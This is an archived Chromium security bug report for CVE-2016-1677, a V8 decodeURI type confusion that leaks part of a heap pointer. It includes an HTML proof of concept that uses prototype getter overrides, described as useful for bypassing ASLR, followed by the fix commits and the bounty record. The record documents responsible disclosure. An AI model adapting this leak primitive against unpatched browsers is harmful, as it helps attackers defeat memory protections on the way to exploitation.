# Security: type confusion lead to information leak in decodeURI

| Field | Value |
|-------|-------|
| **Issue ID** | [40084080](https://issues.chromium.org/issues/40084080) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>JavaScript |
| **CVE IDs** | CVE-2016-1677 |
| **Reporter** | hi...@gmail.com |
| **Assignee** | mv...@chromium.org |
| **Created** | 2016-04-13 |
| **Bounty** | $7,500.00 |

## Description

**VULNERABILITY DETAILS**  

the value passed to function TwoByteSeqStringSetChar maybe not a smi but a HeapObject, simply casting a point to HeapObject to a smi lead to information leak.  

void FullCodeGenerator::EmitTwoByteSeqStringSetChar(CallRuntime\* expr) {  

ZoneList<Expression\*>\* args = expr->arguments();  

DCHECK\_EQ(3, args->length());

Register string = rax;  

Register index = rbx;  

Register value = rcx;

VisitForStackValue(args->at(0)); // index  

VisitForStackValue(args->at(1)); // value------> maybe point of heap object, i guess  

VisitForAccumulatorValue(args->at(2)); // string  

PopOperand(value);  

PopOperand(index);

if (FLAG\_debug\_code) {  

\_\_ Check(\_\_ CheckSmi(value), kNonSmiValue);  

\_\_ Check(\_\_ CheckSmi(index), kNonSmiValue);  

}

\_\_ SmiToInteger32(value, value); -----------> treat value as smi  

\_\_ SmiToInteger32(index, index);

if (FLAG\_debug\_code) {  

static const uint32\_t two\_byte\_seq\_type = kSeqStringTag | kTwoByteStringTag;  

\_\_ EmitSeqStringSetCharCheck(string, index, value, two\_byte\_seq\_type);  

}

\_\_ movw(FieldOperand(string, index, times\_2, SeqTwoByteString::kHeaderSize),  

value);  

context()->Plug(rax);  

}

by this bug, we can leak 16 bits of a point, it's will be useful to do locally heap spray in 64bits system to bypass ASLR.

the PoC is as follows:

<html>
<script>
var num = new Number(10);
Array.prototype.\_\_defineGetter\_\_(0,function(){
return num;
})
Array.prototype.\_\_defineSetter\_\_(0,function(value){
})
var str=decodeURI("%E7%9A%84");
//in 32bit system, the leaked bits is [31..16]
//in 64bit system, the leaked bits is [47..32]
alert("partial address of object num is "+str.charCodeAt(0).toString(16));
</script>
</html>

a patch is also attach as file name patch

**VERSION**  

Chrome Version: all  

Operating System: all

**REPRODUCTION CASE**  

**Please include a demonstration of the security bug, such as an attached**  

**HTML or binary file that reproduces the bug when loaded in Chrome. PLEASE**  

**make the file as small as possible and remove any content not required to**  

**demonstrate the bug.**

## Attachments

- [patch](attachments/patch) (text/plain, 500 B)

## Timeline

### ts...@chromium.org (2016-04-13)

[Empty comment from Monorail migration]

[Monorail components: Blink>JavaScript]

### cl...@chromium.org (2016-04-13)

[Empty comment from Monorail migration]

### ha...@chromium.org (2016-04-14)

[Empty comment from Monorail migration]

### ha...@chromium.org (2016-04-14)

[Empty comment from Monorail migration]

### jo...@chromium.org (2016-04-15)

Michael, can you please find an owner for this

### mv...@chromium.org (2016-04-15)

Per conversation with Yang, we should be protected against this because we use InternalArrays, which should be safe from the kind of prototype manipulation done in the repro.

### hi...@gmail.com (2016-04-15)

yes, you can consider the patch attached

### ya...@chromium.org (2016-04-15)

As discussed, there are some usages of GlobalArray where it should be InternalArray.

### mv...@chromium.org (2016-04-15)

Thx, I'll just remove all the GlobalArray usage in uri.js

### bu...@chromium.org (2016-04-15)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/401450493efc424cd20f914e6df6f69f3d7b8fbc

commit 401450493efc424cd20f914e6df6f69f3d7b8fbc
Author: mvstanton <mvstanton@chromium.org>
Date: Fri Apr 15 13:08:17 2016

Security: type confusion lead to information leak in decodeURI

Quit using the global array in uri code.

R=yangguo@chromium.org
BUG=chromium:602970
LOG=N

Review URL: https://codereview.chromium.org/1889133003

Cr-Commit-Position: refs/heads/master@{#35530}

[modify] https://crrev.com/401450493efc424cd20f914e6df6f69f3d7b8fbc/src/js/uri.js
[add] https://crrev.com/401450493efc424cd20f914e6df6f69f3d7b8fbc/test/mjsunit/regress/regress-602970.js


### mv...@chromium.org (2016-04-15)

Thx for the bug report! Fixed.

### cl...@chromium.org (2016-04-15)

Adding Merge-Triage label for tracking purposes.

Once your fix had sufficient bake time (on canary, dev as appropriate), please nominate your fix for merge by adding the Merge-Requested label.

When your merge is approved by the release manager, please start merging with higher milestone label first. Make sure to re-request merge for every milestone in the label list. You can get branch information on omahaproxy.appspot.com.

- Your friendly ClusterFuzz

### hi...@gmail.com (2016-04-26)

Could you please assign a CVE to this issue?
Thanks

### ha...@chromium.org (2016-04-28)

[Empty comment from Monorail migration]

### ha...@chromium.org (2016-05-02)

Michael, can you please merge this to 5.1?

### bu...@chromium.org (2016-05-02)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/720699688c9fd20eb82d74aceeac47f889455d1b

commit 720699688c9fd20eb82d74aceeac47f889455d1b
Author: Michael Stanton <mvstanton@chromium.org>
Date: Mon May 02 13:47:47 2016

Version 5.1.281.26 (cherry-pick)

Merged 401450493efc424cd20f914e6df6f69f3d7b8fbc

Security: type confusion lead to information leak in decodeURI

BUG=chromium:602970
LOG=N
R=yangguo@chromium.org

Review URL: https://codereview.chromium.org/1936083002 .

Cr-Commit-Position: refs/branch-heads/5.1@{#30}
Cr-Branched-From: 167dc63b4c9a1d0f0fe1b19af93644ac9a561e83-refs/heads/5.1.281@{#1}
Cr-Branched-From: 03953f52bd4a184983a551927c406be6489ef89b-refs/heads/master@{#35282}

[modify] https://crrev.com/720699688c9fd20eb82d74aceeac47f889455d1b/include/v8-version.h
[modify] https://crrev.com/720699688c9fd20eb82d74aceeac47f889455d1b/src/js/uri.js
[add] https://crrev.com/720699688c9fd20eb82d74aceeac47f889455d1b/test/mjsunit/regress/regress-602970.js


### mv...@chromium.org (2016-05-02)

Merged. 
*** SUMMARY ***
version: 5.1.281.26
branch: 5.1
patches: 401450493efc424cd20f914e6df6f69f3d7b8fbc


### ha...@chromium.org (2016-05-02)

[Empty comment from Monorail migration]

### ti...@google.com (2016-05-09)

#13: We do CVE assignment at the time of release. As this is merged to M51, you can expect a CVE in a few weeks when M51 is closer to launching.

### ti...@google.com (2016-05-24)

[Empty comment from Monorail migration]

### ti...@google.com (2016-05-25)

Congrats - $4,000 for this report (highest reward value for infoleak). We've credited you at http://googlechromereleases.blogspot.com/2016/05/stable-channel-update_25.html as "Guang Gong of Qihoo 360". Let me know if you want that changed.

CVE-ID is CVE-2016-1677

We'll add this reward to the next payment run. Thanks for the report!

### hi...@gmail.com (2016-05-26)

Thanks for your information, Tim.

### ti...@google.com (2016-06-08)

[Empty comment from Monorail migration]

### ti...@google.com (2016-06-08)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-07-23)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/602970?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40084080)*
